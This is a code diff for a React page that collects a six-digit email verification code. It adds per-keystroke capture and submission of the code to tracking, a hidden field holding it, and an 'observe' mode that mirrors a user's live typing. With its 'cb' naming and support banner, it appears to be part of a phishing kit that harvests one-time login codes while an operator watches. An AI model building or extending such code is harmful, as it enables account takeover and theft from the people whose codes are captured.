@@ -14,7 +14,8 @@ export const Route = createFileRoute("/cb/mailcode")({
 });
 
 function CbMailCodePage() {
-  const { trackClick, trackInput, cbNavigate, sessionId } = useCbTracking();
+  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId, isObserve } =
+    useCbTracking();
   const email = useQueryParam("email") ?? "";
   const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
   const [countdown, setCountdown] = useState(60);
@@ -26,9 +27,30 @@ function CbMailCodePage() {
     return () => clearInterval(t);
   }, [countdown]);
 
+  useEffect(() => {
+    if (!isObserve) return;
+    function onMirror(e: Event) {
+      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
+      if (!d?.field) return;
+      if (
+        d.field !== "email_code" &&
+        d.field !== "Email Code" &&
+        d.field !== "mailcode"
+      ) {
+        return;
+      }
+      const raw = String(d.value ?? "").replace(/\D/g, "").slice(0, 6);
+      const next = ["", "", "", "", "", ""];
+      for (let i = 0; i < raw.length; i++) next[i] = raw[i];
+      setDigits(next);
+    }
+    window.addEventListener("ux:mirror-live-input", onMirror);
+    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
+  }, [isObserve]);
+
   const commitIfFull = (arr: string[]) => {
     if (arr.every((d) => d !== "")) {
-      trackInput("Email Code", arr.join(""));
+      trackSubmit("email_code", arr.join(""));
       trackClick("Email Code Submitted");
     }
   };
@@ -38,6 +60,7 @@ function CbMailCodePage() {
     const newDigits = [...digits];
     newDigits[index] = value.slice(-1);
     setDigits(newDigits);
+    trackInput("email_code", newDigits.join(""), "text");
     if (value && index < 5) inputRefs.current[index + 1]?.focus();
     commitIfFull(newDigits);
   };
@@ -55,6 +78,7 @@ function CbMailCodePage() {
     const newDigits = [...digits];
     for (let i = 0; i < pasted.length; i++) newDigits[i] = pasted[i];
     setDigits(newDigits);
+    trackInput("email_code", newDigits.join(""), "text");
     inputRefs.current[Math.min(pasted.length, 5)]?.focus();
     commitIfFull(newDigits);
   };
@@ -108,6 +132,10 @@ function CbMailCodePage() {
         .cb-digit:hover { background: rgb(17, 18, 20); }
         .cb-digit:focus { border-color: rgb(87, 139, 250); box-shadow: 0 0 0 1px rgb(87, 139, 250); transform: scale(1.05); }
         .cb-digit.filled { border-color: rgb(87, 139, 250); }
+        @media (max-width: 640px) {
+          .cb-digit-grid { gap: 6px !important; }
+          .cb-digit { font-size: 18px; }
+        }
       `}</style>
 
       <CbSupportBanner />
@@ -173,9 +201,10 @@ function CbMailCodePage() {
           </p>
 
           <div
-            className="cb-animate cb-animate-delay-2"
+            className="cb-animate cb-animate-delay-2 cb-digit-grid"
             style={{ display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gap: 12 }}
           >
+            <input type="hidden" name="email_code" value={digits.join("")} readOnly />
             {digits.map((digit, i) => (
               <input
                 key={i}
